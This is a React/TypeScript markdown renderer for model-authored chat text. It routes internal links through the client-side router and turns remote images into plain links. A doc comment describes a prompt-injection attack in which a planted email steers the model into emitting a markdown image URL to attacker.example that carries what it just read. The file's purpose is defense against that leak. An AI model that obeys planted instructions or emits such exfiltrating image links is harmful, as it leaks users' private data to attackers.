import type { ComponentProps } from 'react';

import ReactMarkdown from 'react-markdown';
import { Link, useInRouterContext } from 'react-router-dom';
import remarkGfm from 'remark-gfm';

/** A site-relative path: one leading slash, not a protocol-relative `//host`. */
const INTERNAL_PATH = /^\/(?!\/)/;

/**
 * Anchors in model-authored text. An internal path — which is what the chat's
 * search tools hand the model as `link` (`/content/<id>`, `/events/<id>`) —
 * becomes a client-side navigation instead of a full reload that drops the
 * open conversation. Everything else stays a plain anchor. Falls back to an
 * anchor outside a router (tests, stories, and any caller that has none).
 */
function MarkdownLink({ href, children, ...rest }: ComponentProps<'a'>) {
  const inRouter = useInRouterContext();

  if (inRouter && href && INTERNAL_PATH.test(href)) {
    return (
      <Link to={href} {...rest}>
        {children}
      </Link>
    );
  }

  return (
    <a href={href} {...rest}>
      {children}
    </a>
  );
}

/**
 * Is this image source one the appliance itself serves?
 *
 * A site-relative path, or an absolute URL on this origin. Anything else is
 * a remote host the model chose.
 */
function isOwnOriginImage(src: string): boolean {
  if (INTERNAL_PATH.test(src)) {
    return true;
  }

  try {
    return new URL(src, window.location.origin).origin === window.location.origin;
  } catch {
    return false;
  }
}

/**
 * Images in model-authored text.
 *
 * A markdown image is a request the READER's browser makes the moment the
 * text renders, with no click. That makes it an exfiltration channel that
 * needs no tool: a model steered by a planted email can end its reply with
 * `![](https://attacker.example/log?d=<what it just read>)`, and the query
 * string leaves the appliance the instant the message paints. The gateway's
 * CSP allows `img-src *` on purpose (thumbnails, posters), so the renderer has
 * to be the control.
 *
 * Own-origin images still render — the chat's photo results are `/api/...`
 * paths. A remote one becomes a plain link the reader can choose to open,
 * showing where it goes, with no referrer if they do.
 */
function MarkdownImage({ src, alt, ...rest }: ComponentProps<'img'>) {
  const source = typeof src === 'string' ? src : '';

  if (source && isOwnOriginImage(source)) {
    return <img src={source} alt={alt} {...rest} />;
  }

  if (!source) {
    return null;
  }

  return (
    <a href={source} rel="noopener noreferrer" target="_blank" data-remote-image="">
      {alt || source}
    </a>
  );
}

interface Props {
  children?: string | null;
  /**
   * Drop the paragraph wrapper, rendering the content as inline nodes.
   *
   * For callers whose markup already supplies the block: a feed card's bullet is
   * a `<li>` (sometimes with its own flex layout and bullet glyph), and the
   * default `<p>` either nests illegally inside an existing `<p>` or introduces
   * a block box that breaks that layout. Only the paragraph is unwrapped —
   * emphasis, links, and code still render, which is all these one-line strings
   * contain in practice.
   *
   * Multi-paragraph content passed with `inline` runs together, so use it only
   * where the content is known to be a single line.
   */
  inline?: boolean;
}

/**
 * Markdown renderer for model-authored text.
 *
 * Raw HTML is NOT enabled (no rehype-raw), so embedded markup in an LLM
 * response renders as literal text rather than executing — the reason this is
 * safe to point at generated content. Markdown's own image syntax is the one
 * construct that still fetches on render, and {@link MarkdownImage} is what
 * keeps that fetch on this origin.
 */
export function Markdown({ children, inline = false }: Props) {
  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      components={{
        a: MarkdownLink,
        img: MarkdownImage,
        ...(inline && { p: ({ children: content }) => <>{content}</> }),
      }}
    >
      {children}
    </ReactMarkdown>
  );
}
